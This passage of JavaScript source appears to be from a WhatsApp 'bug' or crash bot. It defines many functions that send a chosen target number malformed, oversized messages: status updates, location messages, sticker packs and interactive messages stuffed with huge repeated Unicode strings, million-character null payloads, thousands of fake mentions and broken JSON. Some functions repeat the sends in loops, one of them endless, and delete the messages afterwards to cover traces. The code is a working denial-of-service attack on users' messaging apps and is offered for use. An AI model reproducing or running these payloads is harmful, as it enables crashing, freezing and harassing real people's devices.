            id: otax.generateMessageTag(),
            to: toJid
        },
        content: [{
            tag: 'offer',
            attrs: {
                'call-id': callId,
                'call-creator': otax.user.id
            },
            content: offerContent
        }]
    };

    await otax.query(stanza).catch(err => console.error("❌ Error sending call:", err));
    return { id: callId, to: toJid };
}


async function iosLx(Yuukey, target) {
    for (let z = 0; z < 2; z++) {
        await Yuukey.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    locationMessage: {
                        degreesLatitude: 21.1266,
                        degreesLongitude: -11.8199,
                        name: "𑇂𑆵𑆴𑆿".repeat(60000),
                        url: "https://t.me/forno",
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
                            externalAdReply: {
                                quotedAd: {
                                    advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                                    mediaType: "IMAGE",
                                    jpegThumbnail: null,
                                    caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                                },
                                placeholderKey: {
                                    remoteJid: "0s.whatsapp.net",
                                    fromMe: false,
                                    id: "ABCDEF1234567890"
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }
}

async function gsGlx(otax, target, zid = true) {
    for (let z = 0; z < 10; z++) {
        let msg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
                },
                body: {
                    text: "7eppeli - Expos3d",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(1000000)}\"}}`,
                    version: 3
                }
            }
        }, {});

        await otax.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, zid ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
    }
}

async function stInt(otax, target) {
    for (let z = 0; z < 10; z++) {
        let ZxY = {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                    isForwarded: true,
                    forwardingScore: 7205,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "12037205250208@newsletter",
                        newsletterName: "ange Ama lu",
                        serverMessageId: 1000,
                        accessibilityText: "Just Me Alone otax˒"
                    },
                    statusAttributionType: "RESHARED_FROM_MENTION_MANY_TIMES",
                    statusAttributions: [
                        {
                            type: "STATUS_MENTION",
                            music: {
                                authorName: "otax",
                                songId: Math.random(),
                                title: "Love u Ayun",
                                author: "otax",
                                artistAttribution: "t.me/Otapengenkawin",
                                isExplicit: true
                            }
                        },
                        {
                            type: "GROUP_STATUS",
                            music: {
                                authorName: "otax",
                                songId: Math.random(),
                                title: "Love u Ayun",
                                author: "otax",
                                artistAttribution: "t.me/Otapengenkawin",
                                isExplicit: true
                            }
                        }
                    ]
                },
                body: {
                    text: "otax",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `${"ྃ".repeat(100000)}`,
                    version: 3
                }
            }
        };

        let msg = generateWAMessageFromContent(target, ZxY, {});

        await otax.relayMessage('status@broadcast', msg.message, {
            messageId: msg.key.id,
            statusJidList: [target]
        });
        await sleep(1000);

        await otax.sendMessage('status@broadcast', {
            delete: msg.key
        })
    }
}
async function audiodly(otax, target) {
    for (let i = 0; i < 75; i++) {
        const payload = {
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
                version: 3,
                entryPointConversionSource: "StatusMessage",
            },

            forwardingScore: 0,
            isForwarded: false,
            font: Math.floor(Math.random() * 9),
            background: `#${Math.floor(Math.random() * 16777215)
                .toString(16)
                .padStart(6, "0")}`,

            audioMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                mimetype: "audio/mpeg",
                fileSha256: Buffer.from([
                    226, 213, 217, 102, 205, 126, 232, 145,
                    0, 70, 137, 73, 190, 145, 0, 44,
                    165, 102, 153, 233, 111, 114, 69, 10,
                    55, 61, 186, 131, 245, 153, 93, 211,
                ]),
                fileLength: 432722,
                seconds: 26,
                ptt: false,
                mediaKey: Buffer.from([
                    182, 141, 235, 167, 91, 254, 75, 254,
                    190, 229, 25, 16, 78, 48, 98, 117,
                    42, 71, 65, 199, 10, 164, 16, 57,
                    189, 229, 54, 93, 69, 6, 212, 145,
                ]),
                fileEncSha256: Buffer.from([
                    29, 27, 247, 158, 114, 50, 140, 73,
                    40, 108, 77, 206, 2, 12, 84, 131,
                    54, 42, 63, 11, 46, 208, 136, 131,
                    224, 87, 18, 220, 254, 211, 83, 153,
                ]),
                directPath:
                    "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1746275400,

                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 1900 },
                        () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                    ),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true,
                    businessMessageForwardInfo: {
                        businessOwnerJid: "0@s.whatsapp.net",
                    },
                },
            },
        };

        const msg = generateWAMessageFromContent(
            target,
            {
                ...payload,
                contextInfo: {
                    ...payload.contextInfo,
                    participant: "0@s.whatsapp.net",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from(
                            { length: 1900 },
                            () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                        ),
                    ],
                },
            },
            {}
        );

        await otax.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        console.log(chalk.red(`𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙎𝙤𝙙𝙤𝙢 𝙊𝙡𝙚𝙝 𝙊𝙏𝘼𝙓 ${target}`))
        await sleep(2000);
    }
}
async function AyunBelovedjavGb(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

    const otaxi = {
        extendedTextMessage: {
            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
            matchedText: "https://t.me/Otapengenkawin",
            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
            paymentLinkMetadata: {
                button: { displayText: "Love U My Ayun" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "otax@newsletter",
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(
        target,
        { groupStatusMessageV2: { message: otaxi } },
        {}
    );

    await otax.relayMessage(target, msg.message, { messageId: msg.key.id, userJid: target, });
    await sleep(1000);

    await otax.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: msg.key.id,
        }
    });

    console.log(chalk.bold.red("Delay Visib Success To " + target));
}
async function AyunBelovedjav(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let i = 0; i < 20; i++) {
        const otaxi = {
            extendedTextMessage: {
                text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
                matchedText: "https://t.me/Otapengenkawin",
                description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
                title: "ꦽ".repeat(20000),
                previewType: 6,
                jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
                paymentLinkMetadata: {
                    button: { displayText: "Love U My Ayun" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{".repeat(10000) }
                },
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9999,
                    participant: target,
                    remoteJid: "status@broadcast",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                    ],
                    quotedMessage: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: "otax@newsletter",
                            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                            inviteExpiration: "999999999"
                        }
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                        newsletterJid: "13135550002@newsletter",
                        serverId: 1
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(
            target,
            { groupStatusMessageV2: { message: otaxi } },
            {}
        );

        await otax.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            participant: { jid: target }
        });

        await sleep(1500);

        await otax.sendMessage(target, {
            delete: {
                remoteJid: target,
                fromMe: true,
                id: msg.key.id,
                participant: target
            }
        });
    }

    console.log(chalk.bold.red("Delay Visib Success To " + target));
}
async function LocaFcBeta(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

    const otaxx = proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 922.9999999999999,
                            name: "DO YOU KNOW ME?¿ otax" + "؂ن؃؄ٽ؂ن؃".repeat(40000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "؂ن؃؄ٽ؂ن؃".repeat(40000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                                        caption: "οταϰ ιѕ нєяє"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "нαιι ιм οταϰ⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[".repeat(10000),
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "{[".repeat(10000),
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: "{[".repeat(10000),
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: "{[".repeat(10000),
                            }
                        ]
                    },
                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                version: 3,
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000)
                            },
                            body: {
                                text: "Ewe Bang Enak",
                                format: "DEFAULT"
                            }
                        }
                    }
                }
            }
        }
    });

    const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
}
async function AyunBelovedxhams(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let i = 0; i < 20; i++) {
        const otaxi = {
            extendedTextMessage: {
                text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
                matchedText: "https://t.me/Otapengenkawin",
                description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
                title: "ꦽ".repeat(20000),
                previewType: 6,
                jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
                paymentLinkMetadata: {
                    button: { displayText: "Love U My Ayun" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{".repeat(10000) }
                },
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9999,
                    participant: target,
                    remoteJid: "status@broadcast",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                    ],
                    quotedMessage: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: "otax@newsletter",
                            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                            inviteExpiration: "999999999"
                        }
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                        newsletterJid: "13135550002@newsletter",
                        serverId: 1
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(
            target,
            { groupStatusMessageV2: { message: otaxi } },
            {}
        );

        await otax.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        await sleep(2000)
    }
    console.log(chalk.bold.red("Delay Visib Success To " + target));
}
async function AyunBelovedxnxx(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

    let peler = await otax.relayMessage(
        target,
        {
            extendedTextMessage: {
                text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
                matchedText: "https://t.me/Otapengenkawin",
                description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
                title: "ꦽ".repeat(20000),
                previewType: 6,
                jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
                paymentLinkMetadata: {
                    button: {
                        displayText: "Love U My Ayun"
                    },
                    header: {
                        headerType: 1
                    },
                    provider: {
                        paramsJson: "{".repeat(10000)
                    }
                },
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 9999,
                    participant: target,
                    remoteJid: "status@broadcast",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                    ],
                    quotedMessage: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: "otax@newsletter",
                            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                            inviteExpiration: "999999999"
                        }
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                        newsletterJid: "13135550002@newsletter",
                        serverId: 1
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
    await sleep(1000);
    await otax.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: peler.key.id,
            participant: target
        }
    });

    console.log(chalk.bold.red("Delay Visib Success To " + target));
}
async function stTx(otax, target) {
    while (true) {
        const interMsg = {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "galaxy_message",
                    },
                },
            },
        }
        const payload = {
            extendedTextMessage: {
                text: "otax",
                description: " ayun<3 ",
                title: " is back?!! ",
                paymentLinkMetadata: {
                    button: { displayText: "@otax example" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(500000) },
                },
            },
        };
        const xnxxmsgx = await generateWAMessageFromContent("status@broadcast", interMsg, {});

        const xnxxmsg = await generateWAMessageFromContent("status@broadcast", payload, {});

        if (!xnxxmsg?.message || !xnxxmsg?.key) return;

        await otax.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "Just otax" + "\0".repeat(100),
                        matchedText: "https://t.me/Otapengenkawin",
                        jpegThumbnail: null,
                        previewType: 6,
                        paymentLinkMetadata: {
                            button: {
                                displayText: "Love U My Ayun"
                            },
                            header: {
                                headerType: 1
                            },
                            provider: {
                                paramsJson: "{".repeat(20000)
                            }
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 725}@s.whatsapp.net`),
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120372075681@newsletter",
                                newsletterName: "otax For You",
                                serverMessageId: 7205
                            }
                        }
                    }
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {
                    status_setting: "allowlist"
                },
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: {
                                    jid: target
                                }
                            }
                        ]
                    }
                ]
            }]
        });

        await otax.relayMessage("status@broadcast", xnxxmsg.message, {
            messageId: xnxxmsg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        await otax.relayMessage("status@broadcast", xnxxmsgx.message, {
            messageId: xnxxmsgx.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        await sleep(4000);
    }
}
async function packBlankGroup(otax, target) {
    console.log(chalk.red("𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴"));

    const msg = generateWAMessageFromContent(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "7b1760a6-472d-41b5-bbf5-e724c7de8604",
                name: "otx" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher: "؂ن؃؄ٽ؂ن؃".repeat(10000),
                stickers: [
                    {
                        fileName: "iLkMr4xDw8I8jV2E02tx9KMtnUZsu18ClZ4JvkvKHd0=.webp",
                        isAnimated: false,
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "89684",
                fileSha256: "51VJsrdwSn9fwRckyTfsZIdnrAjZ9vIVgoenEJ0nv6k=",
                fileEncSha256: "UZDYZd1kJ6mREbgDAdfpqgjNmpSHtayTwvkH+4Yrn80=",
                mediaKey: "29ga9NVhHX1LWul9OWo7K+ROdGgFvXIQTrw3RmUMS64=",
                directPath: "/v/t62.15575-24/652905003_1418493843085030_5816252767151869696_n.enc?ccb=11-4",
                contextInfo: {},
                mediaKeyTimestamp: "1773502297",
                trayIconFileName: "7b1760a6-472d-41b5-bbf5-e724c7de8604.png",
                stickerPackSize: "89308",
                stickerPackOrigin: "USER_CREATED"
            }
        },
        {}
    );

    await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function LocaNewManta(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

    const otaxx = proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: true,
                            degreesLongitude: true,
                            name: "σƭαא" + "ꦽ".repeat(180000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(100000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                                        caption: "οταϰ ιѕ нєяє"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "нαιι ιм Manta⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "((".repeat(10000),
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "((".repeat(100000),
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦽ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦾ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            }
                        ]
                    },
                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                version: 3,
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000)
                            },
                            body: {
                                text: "Ewe Bang Enak",
                                format: "DEFAULT"
                            }
                        }
                    }
                }
            }
        }
    });

    const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid: target } });
}
async function LocaNewgbah(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

    const otaxx = proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: true,
                            degreesLongitude: true,
                            name: "otax" + "ꦽ".repeat(180000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(100000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                                        caption: "οταϰ ιѕ нєяє"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "нαιι ιм οταϰ⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "((".repeat(10000),
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "((".repeat(100000),
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦽ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
